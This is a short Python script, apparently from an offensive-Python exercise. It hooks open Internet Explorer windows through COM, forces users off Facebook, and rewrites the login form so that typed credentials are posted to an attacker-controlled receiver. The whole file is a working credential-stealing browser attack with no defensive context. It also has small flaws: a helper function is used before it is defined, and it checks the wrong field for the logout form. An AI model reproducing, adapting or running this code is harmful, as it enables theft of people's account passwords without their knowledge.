#coding=utf-8
import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8080/"

target_sites = {}
target_sites["www.facebook.com"] = {
	"logout_url" : None,
	"logout_form" : "logout_form",
	"login_form_index" : 0,
	"owned" : False
}

#
clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)

while True:
	for browser in windows:
		url = urlparse.urlparse(browser.LocationUrl)
		if url.hostname in target_sites:
			if target_sites[url.hostname]["owned"]:
				continue
			#如果有一个URL，我们可以重定向
			if target_sites[url.hostname]["logout_url"]:
				browser.Navigate(target_sites[url.hostname]["logout_url"])
				wait_for_browser(browser)
			else:
				#检索文件中的所有元素
				full_doc = browser.Document.all
				#
				for i in full_doc:
					try:
						#找到退出登录的表单并提交
						if i.id == target_sites[url.hostname]["logout_url"]:
							i.submit()
							wait_for_browser(browser)
					except:
						pass

			#现在来修改登录表单
			try:
				login_index = target_sites[url.hostname]["login_form_index"]
				login_page = urllib.quote(browser.LocationUrl)
				browser.Document.forms[login_index].action = "%s%s"%(data_receiver,login_page)
				target_sites[url.hostname]["owned"] = True
			except:
				pass
	time.sleep(5)

def wait_for_browser(browser):
	#等待浏览器加载完一个页面
	while browser.ReadyState != 4 and browser.ReadyState != "complete":
		time.sleep(0.1)

	return
